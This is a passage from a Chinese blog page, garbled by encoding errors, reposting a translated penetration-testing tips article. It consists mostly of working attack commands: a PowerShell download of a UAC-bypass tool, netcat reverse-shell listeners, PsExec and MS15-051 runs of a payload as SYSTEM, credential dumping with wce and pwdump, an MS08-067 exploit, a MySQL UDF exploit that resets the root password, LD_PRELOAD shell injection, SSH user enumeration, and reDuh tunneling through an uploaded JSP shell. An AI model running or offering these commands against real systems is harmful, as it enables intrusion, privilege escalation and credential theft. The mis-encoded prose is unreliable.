<p><span class="hljs-comment"># ä½¿ç”¨ powershell è„šæœ¬ä¸Šä¼  <a href="https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe</a> åˆ°ç›®æ ‡æœºå™¨</span><br>echo $client = New-Object System.Net.WebClient &gt; script2.ps1<br>echo $targetlocation = <span class="hljs-string">â€œ<a href="http://192.168.56.102/Akagi64.exe&quot;" target="_blank" rel="noopener">http://192.168.56.102/Akagi64.exe&quot;</a></span> <span class="hljs-meta">&gt;&gt; </span>script3.ps1<br>echo $client.DownloadFile($targetlocation,<span class="hljs-string">â€œAkagi64.exeâ€</span>) <span class="hljs-meta">&gt;&gt; </span>script3.ps1<br>powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1</p>
<p><span class="hljs-comment"># åœ¨ Kali ä¸Šåˆ›å»ºç›‘å¬</span><br>nc -lvp <span class="hljs-number">4444</span></p>
<p><span class="hljs-comment"># ä»¥ç³»ç»Ÿæƒé™ä½¿ç”¨ Akagi64 è¿è¡Œ danger.exe </span><br>Akagi64.exe <span class="hljs-number">1</span> <span class="hljs-symbol">C:</span>\Users\User\Desktop\danger.exe</p>
<p><span class="hljs-comment"># åœ¨ Kali ä¸Šåˆ›å»ºç›‘å¬</span><br>nc -lvp <span class="hljs-number">4444</span></p>
<p><span class="hljs-comment"># ä¸‹ä¸€æ­¥å°±ä¼šåå¼¹ç»™æˆ‘ä»¬ä¸€ä¸ªæè¿‡æƒçš„ shell</span><br><span class="hljs-comment"># ä»¥ç³»ç»Ÿæƒé™ä½¿ç”¨ PsExec è¿è¡Œ danger.exe </span><br>psexec.exe â€“i â€“d â€“accepteula â€“s danger.exe<br></code></pre></div></p>
<h3><span id="-win7-shell-2">ä»¥æ™®é€šç”¨æˆ·èº«ä»½åœ¨ Win7 ä¸Šåå¼¹å…·æœ‰ç³»ç»Ÿæƒé™çš„ Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051</span>
<span class="hljs-symbol">
https:</span><span class="hljs-comment">//www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html</span>
<span class="hljs-symbol">

<p>https:</span><span class="hljs-comment">//<a href="http://www.exploit-db.com/exploits/37049/" target="_blank" rel="noopener">www.exploit-db.com/exploits/37049/</a></span></p>
<p><span class="hljs-meta"># æŸ¥æ‰¾ç›®æ ‡æœºå™¨æ˜¯å¦å®‰è£…äº†è¡¥ä¸ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤</span><br>wmic qfe get<br>wmic qfe | find <span class="hljs-string">â€œ3057191â€</span></p>
<p><span class="hljs-meta"># ä¸Šä¼ ç¼–è¯‘åçš„åˆ©ç”¨ç¨‹åºå¹¶è¿è¡Œå®ƒ</span><br><span class="hljs-symbol"><br>https:</span><span class="hljs-comment">//github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe</span></p>
<p><span class="hljs-meta"># é»˜è®¤æƒ…å†µä¸‹å…¶ä¼šä»¥ç³»ç»Ÿæƒé™æ‰§è¡Œ cmd.exeï¼Œä½†æˆ‘ä»¬éœ€è¦æ”¹å˜æºä»£ç ä»¥è¿è¡Œæˆ‘ä»¬ä¸Šä¼ çš„ danger.exe</span><br><span class="hljs-meta"># https:<span class="hljs-comment">//github.com/hfiref0x/CVE-2015-1701 ä¸‹è½½å®ƒå¹¶å®šä½åˆ° â€œmain.câ€</span></span></p>
<p><span class="hljs-meta"># ä½¿ç”¨ wce.exe è·å–å·²ç™»å½•ç”¨æˆ·çš„æ˜æ–‡è´¦å·å¯†ç </span><br><span class="hljs-symbol"><br>http:</span><span class="hljs-comment">//<a href="http://www.ampliasecurity.com/research/windows-credentials-editor/" target="_blank" rel="noopener">www.ampliasecurity.com/research/windows-credentials-editor/</a></span></p>
<p>wce -w</p>
<p><span class="hljs-meta"># ä½¿ç”¨ pwdump7 è·å–å…¶ä»–ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼</span><br><span class="hljs-symbol"><br>http:</span><span class="hljs-comment">//<a href="http://www.heise.de/download/pwdump.html" target="_blank" rel="noopener">www.heise.de/download/pwdump.html</a></span></p>
<p><span class="hljs-meta"># we can try online hash cracking tools such crackstation.net</span><br></code></pre></div></p>
<h3><span id="ms08-067-8211-metasploit">MS08-067 â€“ ä¸ä½¿ç”¨ Metasploit</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">$ nmap -v -p <span class="hljs-number">139</span>, <span class="hljs-number">445</span> --script=smb-check-vulns --script-args=unsafe=<span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.31</span><span class="hljs-number">.205</span>
$ searchsploit ms08<span class="hljs-number">-067</span>
$ python <span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/exploitdb/</span>platforms<span class="hljs-meta-keyword">/windows/</span>remote/<span class="hljs-number">7132.</span>py <span class="hljs-number">192.168</span><span class="hljs-number">.31</span><span class="hljs-number">.205</span> <span class="hljs-number">1</span>
</code></pre></div>
<h3><span id="-mysql-root">é€šè¿‡ MySQL Root è´¦æˆ·å®ç°ææƒ</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs cs"><span class="hljs-meta"># Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)</span>
$ wget <span class="hljs-number">0xdeadbeef</span>.info/exploits/raptor_udf2.c
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
mysql&gt; use mysql;
mysql&gt; <span class="hljs-function">create table <span class="hljs-title">foo</span>(<span class="hljs-params">line blob</span>)</span>;
mysql&gt; <span class="hljs-function">insert <span class="hljs-keyword">into</span> foo <span class="hljs-title">values</span>(<span class="hljs-params">load_file(<span class="hljs-string">'/home/user/raptor_udf2.so'</span></span>))</span>;
mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> foo <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">'/usr/lib/mysql/plugin/raptor_udf2.so'</span>;
mysql&gt; create function do_system returns integer soname <span class="hljs-string">'raptor_udf2.so'</span>;
mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func;
mysql&gt; <span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">do_system</span>(<span class="hljs-params"><span class="hljs-string">'echo "root:passwd" | chpasswd &gt; /tmp/out; chown user:user /tmp/out'</span></span>)</span>;

<p>user:<del>$ su -<br>Password:<br>user:</del><span class="hljs-meta"># whoami</span><br>root<br>root:~<span class="hljs-meta"># id</span><br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br></code></pre></div></p>
<h3><span id="-ld-preload">ä½¿ç”¨ LD_PRELOAD æ³¨å…¥ç¨‹åº</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby">$ wget <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/jivoi</span><span class="hljs-regexp">/pentest/ldpreload</span>_shell.c
$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so
$ sudo -u user LD_PRELOAD=<span class="hljs-regexp">/tmp/ldpreload</span>_shell.so /usr/local/bin/somesoft
</code></pre></div>
<h3><span id="-openssh">é’ˆå¯¹ OpenSSH ç”¨æˆ·è¿›è¡Œæšä¸¾æ—¶åºæ”»å‡»</span></h3>
<p>æ³¨ï¼šæšä¸¾æ—¶åºæ”»å‡»(â€œEnumeration Timing Attackâ€)å±äºä¾§ä¿¡é“æ”»å‡»/æ—è·¯æ”»å‡»(Side Channel Attack)ï¼Œä¾§ä¿¡é“æ”»å‡»æ˜¯æŒ‡åˆ©ç”¨ä¿¡é“å¤–çš„ä¿¡æ¯ï¼Œæ¯”å¦‚åŠ è§£å¯†çš„é€Ÿåº¦/åŠ è§£å¯†æ—¶èŠ¯ç‰‡å¼•è„šçš„ç”µå‹/å¯†æ–‡ä¼ è¾“çš„æµé‡å’Œé€”å¾„ç­‰è¿›è¡Œæ”»å‡»çš„æ–¹å¼ï¼Œä¸€ä¸ªè¯å½¢å®¹å°±æ˜¯â€œæ—æ•²ä¾§å‡»â€ã€‚â€“å‚è€ƒè‡ª <a href="http://zhihu.com/question/20156213/answer/43377769" target="_blank" rel="noopener">shotgun</a> åœ¨çŸ¥ä¹ä¸Šçš„è§£é‡Šã€‚</p>
<p>osueta æ˜¯ä¸€ä¸ªç”¨äºå¯¹ OpenSSH è¿›è¡Œæ—¶åºæ”»å‡»çš„ python2 è„šæœ¬ï¼Œå…¶å¯ä»¥åˆ©ç”¨æ—¶åºæ”»å‡»æšä¸¾ OpenSSH ç”¨æˆ·åï¼Œå¹¶åœ¨ä¸€å®šæ¡ä»¶ä¸‹å¯ä»¥å¯¹ OpenSSH æœåŠ¡å™¨è¿›è¡Œ DOS æ”»å‡»ã€‚</p>
<div class="hljs code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-comment"># https://github.com/c0r3dump3d/osueta</span>
$ ./osueta.py -H <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.6</span> -p <span class="hljs-number">22</span> -U root -d <span class="hljs-number">30</span> -v <span class="hljs-literal">yes</span>
$ ./osueta.py -H <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.22</span> -p <span class="hljs-number">22</span> -d <span class="hljs-number">15</span> -v <span class="hljs-literal">yes</span> â€“dos <span class="hljs-literal">no</span> -L userfile.txt
</code></pre></div>
<h3><span id="-reduh-http-tcp">ä½¿ç”¨ ReDuh æ„é€ åˆæ³•çš„ HTTP è¯·æ±‚ä»¥å»ºç«‹ TCP é€šé“</span></h3>
<p>æ³¨ï¼š ReDuh æ˜¯ä¸€ä¸ªé€šè¿‡ HTTP åè®®å»ºç«‹éš§é“ä¼ è¾“å„ç§å…¶ä»–æ•°æ®çš„å·¥å…·ã€‚å…¶å¯ä»¥æŠŠå†…ç½‘æœåŠ¡å™¨çš„ç«¯å£é€šè¿‡ http/https éš§é“è½¬å‘åˆ°æœ¬æœºï¼Œå½¢æˆä¸€ä¸ªè¿é€šå›è·¯ã€‚ç”¨äºç›®æ ‡æœåŠ¡å™¨åœ¨å†…ç½‘æˆ–åšäº†ç«¯å£ç­–ç•¥çš„æƒ…å†µä¸‹è¿æ¥ç›®æ ‡æœåŠ¡å™¨å†…éƒ¨å¼€æ”¾ç«¯å£ã€‚</p>
<p>å¯¹äº†äº²ï½ReDuh-Gui å·ç§°ç«¯å£è½¬å‘ç¥å™¨å“¦ã€‚</p>
<div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-meta"># https:<span class="hljs-comment">//github.com/sensepost/reDuh</span></span>

<p><span class="hljs-meta"># æ­¥éª¤ 1</span><br><span class="hljs-meta"># ä¸Šä¼  reDuh.jsp ç›®æ ‡æœåŠ¡å™¨</span><br>$ http:<span class="hljs-comment">//192.168.10.50/uploads/reDuh.jsp</span></p>
<p><span class="hljs-meta"># æ­¥éª¤ 2</span><br><span class="hljs-meta"># åœ¨æœ¬æœºè¿è¡Œ reDuhClient </span><br>$ java -jar reDuhClient.jar http:<span class="hljs-comment">//192.168.10.50/uploads/reDuh.jsp</span></p>
<p><span class="hljs-meta"># æ­¥éª¤ 3</span><br><span class="hljs-meta"># ä½¿ç”¨ nc è¿æ¥ç®¡ç†ç«¯å£</span><br>$ nc -nvv <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">1010</span></p>
<p><span class="hljs-meta"># æ­¥éª¤ 4</span><br><span class="hljs-meta"># ä½¿ç”¨éš§é“è½¬å‘æœ¬åœ°ç«¯å£åˆ°è¿œç¨‹ç›®æ ‡ç«¯å£</span><br>[createTunnel] <span class="hljs-number">7777</span>:<span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.4</span>:<span class="hljs-number">3389</span></p>
<p><span class="hljs-meta"># æ­¥éª¤ 5</span><br><span class="hljs-meta"># ä½¿ç”¨ RDP è¿æ¥è¿œç¨‹</span><br>$ <span class="hljs-meta-keyword">/usr/</span>bin/rdesktop -g <span class="hljs-number">1024</span>x768 -P -z -x l -k en-us -r sound:off localhost:<span class="hljs-number">7777</span><br></code></pre></div></p>
<p>*åŸæ–‡ï¼š<a href="http://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/" target="_blank" rel="noopener">jivoi</a>ï¼ŒFBå°ç¼–xiaixç¼–è¯‘ï¼Œè½¬è‡ªFreeBufé»‘å®¢ä¸æå®¢ï¼ˆFreeBuf.COMï¼‰</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E5%B7%A5%E5%85%B7/">å·¥å…·</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E8%BD%AC%E8%BD%BD/">è½¬è½½</a>
                    
                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">æ¸—é€å­¦ä¹ </a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/article/f7911999.html">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CTFå¯†ç å­¦å¸¸è§çš„åŠ è§£å¯†æ€»ç»“[è½¬è½½]</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/article/e11385dd.html">
                        <span class="hidden-mobile">NMAP-æ¼æ´æ‰«æä¹‹ç‹</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments">
                
                
  <div id="vcomments"></div>
  <script type="text/javascript">
    Fluid.utils.waitElementVisible('vcomments', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
        new Valine({
          el: "#vcomments",
          app_id: "VV0Y0S3Pj6ERI7DEOFLxUFXs-gzGzoHsz",
          app_key: "r20xk8AR5pft8xGRQlWKYoin",
          placeholder: "è¯´ç‚¹ä»€ä¹ˆ",
          path: window.location.pathname,
          avatar: "retro",
          meta: ["nick","mail","link"],
          pageSize: "10",
          lang: "zh-CN",
          highlight: false,
          recordIP: false,
          serverURLs: "",
        });
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the
    <a href="https://valine.js.org" target="_blank" rel="nofollow noopener noopener">comments powered by Valine.</a>
  </noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fxhstudy" target="_blank" rel="nofollow noopener"><span>xFxF</span></a>

  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- ä¸è’œå­ç»Ÿè®¡PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            æ€»è®¿é—®é‡ 
            <span id="busuanzi_value_site_pv"></span>
             æ¬¡
          </span>
      
      
        <!-- ä¸è’œå­ç»Ÿè®¡UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            æ€»è®¿å®¢æ•° 
            <span id="busuanzi_value_site_uv"></span>
             äºº
          </span>
      
    
  </div>


  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>


  <script defer src="/js/leancloud.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>












  
    <!-- Baidu Analytics -->
    <script defer>
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?2c3982f360efc29d0de4a57e127e3cb9";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  

  

  

  

  





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>



</body>
</html>
